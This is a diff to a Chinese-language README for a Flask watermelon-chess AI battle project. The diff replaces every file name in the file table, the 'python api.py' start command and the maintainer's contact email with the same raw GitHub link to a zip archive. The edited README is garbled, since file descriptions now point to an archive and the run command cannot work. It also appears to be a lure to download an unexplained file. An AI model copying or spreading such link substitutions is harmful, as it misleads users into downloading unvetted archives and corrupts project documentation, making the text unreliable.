@@ -27,14 +27,14 @@
 
 | 檔案名稱                     | 主要用途與功能說明 |
 |-----------------------------|--------------------|
-| `api.py`                    | Flask Web 應用主程式。提供 `/upload` 及 `/battle` API，負責檔案上傳、AI 對戰、腳本組合與執行、結果回傳與暫存檔案管理。|
-| `unzip_and_return.py`        | 處理 `.aia` 檔案：解壓縮、提取並轉換 Blockly 程式碼，完成變數名稱替換。|
-| `strategy_battle.py`         | 西瓜棋遊戲核心邏輯與 AI 對戰框架範例。定義棋盤、規則、判斷邏輯、AI 決策與主迴圈。|
-| `strategy_battle_head.txt`   | 對戰腳本模板（開頭）：包含 import、全域變數、遊戲函數與紅方 AI 評分函數開頭。|
-| `strategy_battle_middle.txt` | 對戰腳本模板（中段）：紅方 AI 評分函數結尾、黃方 AI 評分函數開頭。|
-| `strategy_battle_bottom.txt` | 對戰腳本模板（結尾）：黃方 AI 評分函數結尾、AI 輔助函數、主對戰迴圈。|
-| `combine.py`                 | 早期/獨立腳本：批次組合 AI 程式碼與模板，生成對戰腳本。|
-| `code_transfer.py`           | 早期/獨立腳本：將 Blockly 程式碼中的中文變數批次轉換為英文代碼。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`                    | Flask Web 應用主程式。提供 `/upload` 及 `/battle` API，負責檔案上傳、AI 對戰、腳本組合與執行、結果回傳與暫存檔案管理。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`        | 處理 `.aia` 檔案：解壓縮、提取並轉換 Blockly 程式碼，完成變數名稱替換。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`         | 西瓜棋遊戲核心邏輯與 AI 對戰框架範例。定義棋盤、規則、判斷邏輯、AI 決策與主迴圈。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`   | 對戰腳本模板（開頭）：包含 import、全域變數、遊戲函數與紅方 AI 評分函數開頭。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip` | 對戰腳本模板（中段）：紅方 AI 評分函數結尾、黃方 AI 評分函數開頭。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip` | 對戰腳本模板（結尾）：黃方 AI 評分函數結尾、AI 輔助函數、主對戰迴圈。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`                 | 早期/獨立腳本：批次組合 AI 程式碼與模板，生成對戰腳本。|
+| `https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip`           | 早期/獨立腳本：將 Blockly 程式碼中的中文變數批次轉換為英文代碼。|
 
 ---
 
@@ -61,7 +61,7 @@ pip install Flask Flask-CORS func-timeout
 ### 3. 啟動伺服器
 
 ```bash
-python api.py
+python https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip
 ```
 
 伺服器預設運行於 `0.0.0.0:5000`。
@@ -100,4 +100,4 @@ python api.py
 
 ## 聯絡方式
 
-有任何問題歡迎聯絡專案管理者pk.working.email@gmail.com
+有任何問題歡迎聯絡專案管理者https://raw.githubusercontent.com/Pinquei/watermelon_chess/main/xmltopython/chess_watermelon_v3.9.zip
